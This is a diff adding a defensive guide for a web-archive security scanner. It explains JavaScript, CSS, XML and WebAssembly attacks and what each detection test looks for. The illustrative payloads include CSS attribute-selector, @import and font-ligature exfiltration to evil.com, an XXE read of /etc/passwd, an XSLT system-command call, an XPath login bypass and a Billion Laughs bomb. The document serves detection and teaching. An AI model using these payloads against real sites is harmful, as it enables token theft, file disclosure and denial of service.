@@ -1,0 +1,770 @@
+================================================================================
+WEB ARCHIVE SECURITY ANALYSIS PIPELINE
+DETAILED ATTACK EXPLANATIONS & TESTING GUIDE
+================================================================================
+
+This document explains each security test in the pipeline. For every test,
+you will find: what the attack is, how it works step by step, why it matters,
+what the scanner looks for in archived files, and the academic references.
+
+The 4 tests requiring deep binary analysis (DOM XSS taint tracking, WASM
+buffer overflow, WASM control flow hijack, WASM general assessment) have been
+excluded — those require specialized research tools.
+
+Total tests covered: 23 (19 custom scanners + 3 TruffleHog + 1 external tool)
+
+
+================================================================================
+SECTION 1: JAVASCRIPT ATTACKS (.js, .mjs, .jsx, .ts, .tsx)
+================================================================================
+
+
+TEST 1: VULNERABLE LIBRARY DETECTION (Retire.js)
+-------------------------------------------------
+Status: EXISTING — use Retire.js directly
+
+WHAT IS IT?
+JavaScript websites routinely load third-party libraries — jQuery for DOM
+manipulation, AngularJS for frontend frameworks, Lodash for utility functions,
+Bootstrap for UI components. These libraries have version numbers. Over time,
+security researchers find vulnerabilities in specific versions and publish
+CVEs (Common Vulnerabilities and Exposures).
+
+HOW DOES THE ATTACK WORK?
+An attacker looks at which version of jQuery a site uses. If the site loads
+jQuery 1.9.1, and that version has a known XSS vulnerability (CVE-2015-9251),
+the attacker can craft input that exploits that specific bug. The site owners
+may never have updated because the library "still works" — but it works with
+a known hole in it.
+
+Example: jQuery before 3.0.0 had a flaw where passing untrusted HTML to the
+$() function could execute arbitrary JavaScript. Millions of sites were
+affected because they never updated from jQuery 1.x or 2.x.
+
+WHAT DOES THE SCANNER LOOK FOR?
+Retire.js reads JavaScript files, extracts library version strings (from
+comments, file names, or code patterns like jQuery.fn.jquery = "1.9.1"),
+and checks them against its CVE database.
+
+WHY IT MATTERS FOR WEB ARCHIVES
+You can track how long a site kept a vulnerable library version in production.
+Some sites run vulnerable jQuery for 5+ years across hundreds of archived
+snapshots.
+
+Reference: Lauinger et al., NDSS 2017
+Tool: https://github.com/retirejs/retire.js
+
+
+TEST 2: HARDCODED SECRETS / API KEYS (TruffleHog)
+--------------------------------------------------
+Status: EXISTING — use TruffleHog across all files
+
+WHAT IS IT?
+Developers sometimes hardcode sensitive credentials directly into their
+JavaScript code. An AWS secret key, a Stripe API key, a Firebase config
+with full read/write access, a GitHub personal access token — all of these
+grant access to paid services or private data.
+
+HOW DOES THE ATTACK WORK?
+An attacker opens the browser developer tools, reads the JavaScript source,
+and finds something like:
+    const API_KEY = "AKIAIOSFODNN7EXAMPLE"
+Now they have your AWS credentials. They can spin up servers on your account,
+read your S3 buckets, or exfiltrate your database.
+
+WHAT DOES THE SCANNER LOOK FOR?
+TruffleHog uses 700+ regex patterns that match the specific formats of
+different credential types. AWS keys start with "AKIA", Stripe secret keys
+start with "sk_live_", GitHub tokens have a specific prefix and length.
+It also does entropy analysis — random-looking strings near assignment
+operators are flagged.
+
+WHY IT MATTERS FOR WEB ARCHIVES
+Secrets found in archived snapshots may still be valid. Many organizations
+never rotate credentials. A key exposed in a 2019 snapshot might still
+work in 2026.
+
+Tool: https://github.com/trufflesecurity/trufflehog
+
+
+TEST 3: PROTOTYPE POLLUTION SCANNER
+------------------------------------
+Status: EXISTING in PDF
+
+WHAT IS IT?
+In JavaScript, almost every object inherits properties from Object.prototype.
+Prototype pollution is an attack where the attacker injects a property into
+Object.prototype, and that property then appears on EVERY object in the
+entire application.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. A website has a function that deep-merges user-controllable JSON into
+   an object:
+       function merge(target, source) {
+           for (let key in source) {
+               target[key] = source[key];  // UNSAFE
+           }
+       }
+
+2. The attacker sends JSON like: {"__proto__": {"isAdmin": true}}
+
+3. The merge function writes isAdmin onto Object.prototype
+
+4. Now, everywhere in the application, any object.isAdmin returns true:
+       let user = {};
+       console.log(user.isAdmin);  // true — the attacker is now admin
+
+This can lead to XSS, authentication bypass, or remote code execution
+depending on what properties the application checks.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- Direct Object.prototype assignments: Object.prototype.x = ...
+- __proto__ property access in merge/extend functions
+- Known vulnerable functions: $.extend(true, ...), _.merge(), _.defaultsDeep()
+- Lodash versions before 4.17.12 (CVE-2019-10744)
+- Recursive merge patterns without __proto__ filtering
+
+References: Kang et al., NDSS 2022; Shcherbakov & Balliu, USENIX Security 2023
+
+
+TEST 4: OPEN REDIRECT SCANNER
+-------------------------------
+Status: EXISTING in PDF
+
+WHAT IS IT?
+An open redirect is when a website takes a URL from user input and redirects
+the browser to it without checking whether the destination is safe.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. A website has code like:
+       window.location.href = getParameterByName('redirect');
+
+2. A legitimate URL might be:
+       https://example.com/login?redirect=/dashboard
+
+3. An attacker crafts:
+       https://example.com/login?redirect=https://evil.com/phishing
+
+4. The victim sees the trusted example.com domain, clicks, and gets sent
+   to evil.com which looks identical to the real login page.
+
+5. The victim enters their credentials on the phishing page.
+
+Open redirects are also used to bypass URL-based security filters and
+whitelist checks.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- location.href = <variable>
+- location.replace(<variable>)
+- location.assign(<variable>)
+- window.open(<variable>)
+- Where <variable> traces back to user-controllable sources: URL parameters,
+  location.hash, location.search, document.referrer
+
+References: Lekies, Stock & Johns, ACM CCS 2013
+
+
+TEST 5: HIGH-RISK BROWSER API DETECTOR
+----------------------------------------
+Status: EXISTING in PDF
+
+WHAT IS IT?
+Modern browsers expose powerful APIs that can access the user's camera,
+microphone, location, clipboard contents, battery level, and more. These
+APIs are privacy-sensitive. A website should only use them when necessary,
+and the server should set Permissions-Policy headers to restrict which
+origins can invoke them.
+
+HOW DOES THE ATTACK WORK?
+If a website includes a third-party script (an ad network, analytics,
+or a compromised CDN library) and that script calls navigator.geolocation
+.getCurrentPosition(), the user's physical location gets sent to the third
+party. Similarly, navigator.mediaDevices.getUserMedia() can activate the
+camera or microphone.
+
+Even without malicious intent, using these APIs creates an expanded attack
+surface — if any script on the page is compromised, the attacker inherits
+access to all the APIs the page uses.
+
+WHAT DOES THE SCANNER LOOK FOR?
+API calls: navigator.geolocation, navigator.mediaDevices.getUserMedia,
+RTCPeerConnection (WebRTC, can leak local IP), navigator.getBattery,
+navigator.vibrate, navigator.clipboard.read, navigator.clipboard.readText,
+navigator.credentials, Notification.requestPermission, PaymentRequest.
+
+Reference: Snyder, Taylor & Kanich, ACM CCS 2017
+
+
+TEST 6: DANGEROUS SINK USAGE ANALYSIS
+---------------------------------------
+Status: NEW
+
+WHAT IS IT?
+A "sink" in web security is any JavaScript function or property that, when
+given attacker-controlled input, can execute code or modify the page in a
+dangerous way. The most famous sink is eval() — it takes a string and
+executes it as JavaScript code.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. A website has code like:
+       let userInput = location.hash.substring(1);
+       eval(userInput);
+
+2. An attacker sends the victim a link:
+       https://example.com/page#alert(document.cookie)
+
+3. The browser loads the page, reads the hash, passes it to eval(), and
+   the attacker's code runs with full access to the page.
+
+Other dangerous sinks include:
+- new Function("return " + userInput)  — creates and runs a function
+- setTimeout(userInput, 1000)  — if first arg is a string, it evals it
+- setInterval(userInput, 1000)  — same problem
+- document.write(userInput)  — writes raw HTML into the page
+- element.innerHTML = userInput  — parses HTML, can include script tags
+- element.outerHTML = userInput  — same problem
+
+WHAT DOES THE SCANNER LOOK FOR?
+Every occurrence of eval(), Function(), setTimeout/setInterval with string
+arguments, document.write(), innerHTML/outerHTML assignments, and
+insertAdjacentHTML(). Each finding is rated by how close the sink is to
+user-controllable input.
+
+Reference: Stock et al., ACM CCS 2015
+
+
+TEST 7: JSONP CALLBACK INJECTION
+----------------------------------
+Status: NEW
+
+WHAT IS IT?
+Before CORS (Cross-Origin Resource Sharing) existed, websites used JSONP
+(JSON with Padding) to load data across domains. JSONP works by wrapping
+JSON data in a function call — the server returns something like:
+    myCallback({"user": "alice", "email": "alice@example.com"})
+
+The client loads this via a <script> tag, and the browser executes it.
+
+HOW DOES THE ATTACK WORK?
+The problem is the callback function name. If the server takes it from a
+URL parameter without sanitization:
+    https://api.example.com/user?callback=alert
+
+The server returns:
+    alert({"user": "alice", "email": "alice@example.com"})
+
+Now an attacker can inject arbitrary JavaScript. Even worse, any website
+can load this data by adding a <script> tag pointing to the JSONP endpoint,
+stealing the user's data cross-domain.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- Script tags with src URLs containing "callback=" or "jsonp=" parameters
+- JavaScript responses that start with a function call pattern: word(...)
+- URL patterns in code: ?callback=, ?jsonpcallback=, &cb=
+
+References: Grossman, BlackHat 2006; Lekies et al., CCS 2013
+
+
+TEST 8: REGEX DENIAL OF SERVICE (ReDoS)
+-----------------------------------------
+Status: NEW — use existing tools (recheck, safe-regex)
+
+WHAT IS IT?
+Some regular expressions have patterns that cause the regex engine to try
+an exponential number of paths when matching certain inputs. This is called
+"catastrophic backtracking."
+
+HOW DOES THE ATTACK WORK?
+Consider this regex for validating email-like strings:
+    /^([a-zA-Z0-9]+)+@/
+
+This looks innocent. But if you feed it the string "aaaaaaaaaaaaaaaa!" the
+regex engine tries to match the nested quantifiers ([a-zA-Z0-9]+)+ in
+every possible way before concluding it fails. With 16 "a" characters,
+it tries 65,536 paths. With 25, it tries 33 million. With 30, the browser
+tab freezes.
+
+In a web application, if user input is validated with a vulnerable regex,
+an attacker can send a crafted string that locks up the server or the
+browser tab for minutes.
+
+WHAT DOES THE SCANNER LOOK FOR?
+Regex literals and RegExp constructor calls with patterns containing:
+- Nested quantifiers: (a+)+, (a*)*
+- Overlapping alternations: (a|a)+
+- Quantified groups with overlap: (\d+\.)+
+
+Tools: recheck, safe-regex, vuln-regex-detector
+Reference: Davis et al., FSE 2018
+
+
+TEST 9: SERVICE WORKER SCOPE AUDIT
+------------------------------------
+Status: NEW
+
+WHAT IS IT?
+A service worker is a JavaScript file that the browser installs as a
+background proxy for a website. Once registered, it intercepts every
+network request the page makes. It can serve cached responses, modify
+requests, or synthesize responses entirely.
+
+HOW DOES THE ATTACK WORK?
+Service workers are powerful. If an attacker can register a malicious
+service worker (through XSS, for example), they gain persistent control
+over the user's experience on that site — even after the XSS vulnerability
+is patched. The service worker stays installed in the browser.
+
+Even without malicious intent, a legitimate service worker with an overly
+broad scope (registered at "/") intercepts all requests for the entire
+origin. If it caches responses improperly, an attacker who can poison one
+cached response gains persistent control.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- navigator.serviceWorker.register() calls and their scope parameter
+- Service worker files (usually sw.js or service-worker.js)
+- Broad scope registrations (scope: '/')
+- Cache-first strategies without cache validation
+- importScripts() loading external domains inside service workers
+
+Reference: Papadopoulos et al., NDSS 2019
+
+
+TEST 10: CRYPTOMINER DETECTION (JavaScript)
+---------------------------------------------
+Status: NEW
+
+WHAT IS IT?
+In 2017, a service called Coinhive launched a JavaScript-based Monero
+cryptocurrency miner. Website owners could embed it to mine cryptocurrency
+using their visitors' CPU power. Within months, thousands of sites added
+miners — some intentionally as an alternative to ads, many through
+compromised third-party scripts.
+
+HOW DOES THE ATTACK WORK?
+The visitor loads a web page. A script starts running in the background,
+performing hash computations (CryptoNight algorithm) using the visitor's
+CPU. The visitor's computer slows down, battery drains, fans spin up —
+while the site owner earns cryptocurrency.
+
+Many miners were injected without the site owner's knowledge — through
+compromised WordPress plugins, hacked CDN scripts, or malicious ads.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- Known miner script URLs (coinhive.min.js, cryptoloot.pro, coin-hive.com)
+- Mining initialization patterns: CoinHive.Anonymous, new CoinHive.Client
+- WebSocket connections to known mining pools
+- Characteristic variable/function names from mining libraries
+- High computational patterns (hash loops, nonce incrementing)
+
+References: Konoth et al., CCS 2018; Hong et al., CCS 2018
+
+
+TEST 11: POSTMESSAGE HANDLER AUDIT
+------------------------------------
+Status: NEW
+
+WHAT IS IT?
+window.postMessage() is the HTML5 API for cross-origin communication. A
+parent page can send messages to an embedded iframe, and vice versa. The
+critical security requirement is that the RECEIVER must check the ORIGIN
+of every incoming message.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. A website has code like:
+       window.addEventListener('message', function(event) {
+           document.getElementById('output').innerHTML = event.data;
+       });
+
+2. Notice: no origin check. Any website can send messages to this page.
+
+3. An attacker creates a page that loads the target in an iframe:
+       <iframe src="https://target.com/page"></iframe>
+       <script>
+       frames[0].postMessage('<img src=x onerror=alert(document.cookie)>', '*');
+       </script>
+
+4. The target page receives the message and writes it into innerHTML,
+   executing the attacker's JavaScript. The attacker now has the victim's
+   cookies, session tokens, etc.
+
+Even with partial origin checks, developers make mistakes:
+- Using indexOf instead of exact match (evil-normal-website.com passes)
+- Checking against a regex that can be bypassed
+- Only checking the protocol, not the domain
+
+WHAT DOES THE SCANNER LOOK FOR?
+- addEventListener('message', ...) handlers
+- Missing event.origin checks inside the handler
+- Weak origin checks (indexOf, includes, startsWith instead of ===)
+- Message data flowing into dangerous sinks (innerHTML, eval, location)
+
+Reference: Son & Shmatikov, NDSS 2013
+
+
+================================================================================
+SECTION 2: CSS ATTACKS (.css)
+================================================================================
+
+
+TEST 12: CSS DATA EXFILTRATION VIA ATTRIBUTE SELECTORS
+-------------------------------------------------------
+Status: NEW
+
+WHAT IS IT?
+CSS attribute selectors can match HTML elements based on their attribute
+values. Combined with properties that trigger HTTP requests (like
+background-image: url()), this creates a data exfiltration channel that
+works even when JavaScript is completely blocked by Content Security Policy.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. A page has a CSRF token in a hidden form field:
+       <input type="hidden" name="csrf" value="a8f3b2...">
+
+2. The attacker injects CSS (through a CSS injection vulnerability):
+       input[name=csrf][value^=a] { background-image: url(https://evil.com/leak?char=a); }
+       input[name=csrf][value^=b] { background-image: url(https://evil.com/leak?char=b); }
+       ... (one rule per character)
+
+3. The browser evaluates all rules. The one matching value^=a fires, and
+   the browser sends a request to evil.com/leak?char=a
+
+4. The attacker now knows the first character is "a". They generate new
+   CSS to find the second character:
+       input[name=csrf][value^=a8] { background-image: url(https://evil.com/leak?prefix=a8); }
+       input[name=csrf][value^=a9] { background-image: url(https://evil.com/leak?prefix=a9); }
+
+5. Repeat until the entire token is exfiltrated.
+
+This bypasses CSP because no JavaScript is involved — it's pure CSS.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- Attribute selectors matching value, name, or other sensitive attributes
+  combined with url() in the same rule
+- Patterns like [value^=], [value$=], [value*=] paired with external URLs
+- Style injection points where user input enters a style attribute or tag
+
+Reference: Heyes, PortSwigger Research 2024
+
+
+TEST 13: @IMPORT CHAINED EXFILTRATION
+---------------------------------------
+Status: NEW
+
+WHAT IS IT?
+This is an advanced version of CSS exfiltration that works from a SINGLE
+injection point — no page reloads, no iframes. It chains CSS @import
+rules so each one blocks until the previous character has been leaked.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. The attacker injects a <style> tag with an @import pointing to their
+   server:
+       <style>@import 'https://evil.com/start'</style>
+
+2. The evil server returns a stylesheet with multiple @import rules:
+       @import 'https://evil.com/leak?pos=0&char=a';
+       @import 'https://evil.com/leak?pos=0&char=b';
+       ... (one per character)
+
+3. The server holds ALL responses open (blocking) EXCEPT the one matching
+   the actual first character of the token. That one returns immediately
+   with the next round of @import rules.
+
+4. Over HTTP/2 (which multiplexes connections), this is blazingly fast.
+   The entire token can be exfiltrated in under 3 seconds.
+
+This technique works in Chrome (async import processing) and Firefox
+(with adaptations).
+
+WHAT DOES THE SCANNER LOOK FOR?
+- @import rules referencing external domains
+- Chains of multiple @import rules in sequence
+- @import rules inside injected <style> tags in HTML
+- CSS files that dynamically import from suspicious external domains
+
+Reference: Securitum, 2020; Heyes, PortSwigger 2025
+
+
+TEST 14: CSS KEYLOGGING VIA FONT LIGATURES
+--------------------------------------------
+Status: NEW
+
+WHAT IS IT?
+A font ligature is a typographic feature where two or more characters are
+combined into a single glyph. The attacker creates a custom font where
+specific character sequences are mapped to glyphs loaded from an external
+server. When the browser renders text using this font, it sends an HTTP
+request for each character, leaking the content.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. The attacker creates @font-face rules with unicode-range:
+       @font-face {
+           font-family: "leak";
+           src: url(https://evil.com/log?char=A);
+           unicode-range: U+0041;  /* 'A' */
+       }
+       @font-face {
+           font-family: "leak";
+           src: url(https://evil.com/log?char=B);
+           unicode-range: U+0042;  /* 'B' */
+       }
+       ... (one per character)
+
+2. They apply this font to a targeted element:
+       #secret-token { font-family: "leak"; }
+
+3. When the browser renders the text in #secret-token, it checks which
+   unicode ranges are needed and fetches the corresponding font files.
+
+4. The attacker's server receives one request per unique character in
+   the text, revealing its contents.
+
+Unlike attribute selectors (Test 12), this technique leaks TEXT NODE
+content — not just attribute values. It can steal visible text, rendered
+tokens, or any displayed content.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- @font-face with unusual unicode-range declarations (many individual ranges)
+- External src URLs in @font-face combined with narrow unicode-range
+- Font families applied to elements likely to contain sensitive data
+  (form fields, token displays)
+
+Reference: Gualtieri, 2018
+
+
+================================================================================
+SECTION 3: XML ATTACKS (.xml, .xsl, .xslt, .soap, .rss, .atom)
+================================================================================
+
+
+TEST 15: XXE (XML EXTERNAL ENTITY) PATTERN DETECTION
+------------------------------------------------------
+Status: NEW
+
+WHAT IS IT?
+XML parsers can be configured to process "external entities" — references
+to external resources defined in a DOCTYPE declaration. If the parser
+follows these references, an attacker who controls the XML input can read
+local files on the server, make requests to internal network services,
+or cause denial of service.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. The attacker sends XML with a custom entity pointing to a local file:
+       <?xml version="1.0"?>
+       <!DOCTYPE foo [
+           <!ENTITY xxe SYSTEM "file:///etc/passwd">
+       ]>
+       <data>&xxe;</data>
+
+2. The XML parser resolves &xxe; by reading /etc/passwd and inserting
+   its contents into the <data> element.
+
+3. If the application returns the parsed XML, the attacker sees the
+   file contents. Even if it doesn't, the attacker can exfiltrate data
+   via out-of-band channels (sending the file to their server).
+
+Variations include:
+- SSRF: <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
+- DoS: Billion Laughs (see Test 17)
+- Data exfil: Using parameter entities to send data to external servers
+
+WHAT DOES THE SCANNER LOOK FOR?
+- <!DOCTYPE declarations with <!ENTITY definitions
+- SYSTEM or PUBLIC keywords in entity declarations
+- Parameter entities (% entities)
+- References to file://, http://, or other URI schemes in entities
+
+Reference: Morgan, 2014; OWASP XXE Prevention Cheat Sheet
+
+
+TEST 16: XPATH INJECTION INDICATORS
+-------------------------------------
+Status: NEW
+
+WHAT IS IT?
+XPath is a query language for selecting nodes from XML documents — similar
+to how SQL queries databases. If an application builds XPath expressions
+using unsanitized user input, an attacker can manipulate the query.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. An application authenticates users against an XML file:
+       <users>
+           <user><name>alice</name><pass>secret123</pass></user>
+           <user><name>admin</name><pass>sup3rs3cur3</pass></user>
+       </users>
+
+2. The XPath query is built with user input:
+       "//user[name='" + username + "' and pass='" + password + "']"
+
+3. Normal input: username=alice, password=secret123
+       //user[name='alice' and pass='secret123']  → returns alice's node
+
+4. Attack input: username=admin' or '1'='1, password=anything' or '1'='1
+       //user[name='admin' or '1'='1' and pass='anything' or '1'='1']
+       → returns ALL user nodes → authentication bypassed
+
+Unlike SQL injection, there are no UNION or DROP TABLE equivalents, but
+the attacker can extract the entire XML document node by node.
+
+WHAT DOES THE SCANNER LOOK FOR?
+In XSLT and XML configuration files:
+- xsl:value-of select="" with dynamic or concatenated expressions
+- XPath expressions that reference external parameters
+- document() function calls that take user input
+- Variable interpolation inside XPath predicates
+
+Reference: Amit Klein, 2005; OWASP XPath Injection
+
+
+TEST 17: XML BOMB / BILLION LAUGHS DETECTION
+----------------------------------------------
+Status: NEW
+
+WHAT IS IT?
+An XML bomb (also called "Billion Laughs") is a denial-of-service attack
+that uses nested entity expansion to consume exponential amounts of memory.
+
+HOW DOES THE ATTACK WORK?
+Step by step:
+
+1. The attacker sends this XML:
+       <?xml version="1.0"?>
+       <!DOCTYPE lolz [
+           <!ENTITY lol "lol">
+           <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+           <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+           <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+       ]>
+       <root>&lol4;</root>
+
+2. Each entity references the previous one 10 times:
+   - lol = "lol" (3 bytes)
+   - lol2 = 10 × lol = 30 bytes
+   - lol3 = 10 × lol2 = 300 bytes
+   - lol4 = 10 × lol3 = 3,000 bytes
+   - Continue to lol9 = 3 billion bytes (3 GB) from a 1 KB input
+
+3. The XML parser tries to expand all entities and runs out of memory.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- Entity definitions that reference other entities (recursive/nested)
+- Counting entity nesting depth (more than 2-3 levels is suspicious)
+- Parameter entities referencing other parameter entities
+- DOCTYPE sections with more than 3-4 ENTITY declarations
+
+Reference: Sullivan, MSDN 2009; OWASP XML Security Cheat Sheet
+
+
+TEST 18: XSLT INJECTION
+-------------------------
+Status: NEW
+
+WHAT IS IT?
+XSLT (Extensible Stylesheet Language Transformations) is a language for
+transforming XML documents. It's surprisingly powerful — in some
+implementations, XSLT can execute system commands, read files, and make
+network requests.
+
+HOW DOES THE ATTACK WORK?
+If an attacker can control or inject into an XSLT stylesheet:
+
+1. Read files (using document() function):
+       <xsl:value-of select="document('file:///etc/passwd')"/>
+
+2. Execute commands (in some processors like PHP's xsltproc):
+       <xsl:value-of select="php:function('system', 'id')"/>
+
+3. Make network requests:
+       <xsl:value-of select="document('http://evil.com/')"/>
+
+4. Leak system information:
+       <xsl:value-of select="system-property('xsl:vendor')"/>
+
+Even in archived data, XSLT files that use these dangerous functions
+indicate that the application's XSLT processing was potentially exploitable.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- document() function calls with external URLs
+- system-property() calls
+- xsl:script or msxsl:script elements (allow arbitrary code)
+- php:function(), saxon:evaluate(), or other extension functions
+- xsl:include/xsl:import with external hrefs
+- Expressions that concatenate variables into XPath (injection points)
+
+Reference: Braga, 2015; OWASP XSLT Injection
+
+
+================================================================================
+SECTION 4: WEBASSEMBLY ATTACKS (.wasm)
+================================================================================
+
+
+TEST 19: CRYPTOMINER DETECTION (WASM)
+---------------------------------------
+Status: NEW
+
+WHAT IS IT?
+WebAssembly made in-browser cryptocurrency mining practical because WASM
+code runs 10-20x faster than equivalent JavaScript. Mining algorithms like
+CryptoNight (used by Monero) require heavy computation — WASM provides
+the performance needed to make it profitable at scale.
+
+HOW DOES THE ATTACK WORK?
+The attack is the same as JavaScript cryptomining (Test 10), but the
+mining computation runs inside a WASM module for better performance.
+The WASM file is loaded by a small JavaScript wrapper:
+
+    WebAssembly.instantiateStreaming(fetch('miner.wasm'), imports)
+    .then(result => { result.instance.exports.start_mining(); });
+
+The WASM module typically implements the hash function (CryptoNight,
+RandomX, Argon2) and communicates mining jobs/results back to JavaScript
+which connects to the mining pool via WebSocket.
+
+WHAT DOES THE SCANNER LOOK FOR?
+- WASM files with characteristic byte sequences from known miners
+- Section names or export names containing mining-related strings
+  (hash, scratchpad, cn_slow_hash, cryptonight)
+- Known file hashes of Coinhive/CryptoLoot WASM modules
+- JavaScript loader patterns: WebAssembly.instantiate near mining pool URLs
+
+References: Konoth et al., CCS 2018; Romano et al., IEEE S&P 2020
+
+
+================================================================================
+SECTION 5: CROSS-CUTTING (All file types)
+================================================================================
+
+
+TEST 20-22: TRUFFLEHOG SECRET SCANNING
+----------------------------------------
+Status: Runs on ALL files (.js, .css, .xml, .wasm metadata)
+
+Covered above in Test 2. TruffleHog scans every file in the archive for
+700+ credential patterns. Run it separately as:
+
+    trufflehog filesystem --directory /path/to/archived/files
+
+Tool: https://github.com/trufflesecurity/trufflehog
+
+
+================================================================================
+END OF DOCUMENT
+================================================================================
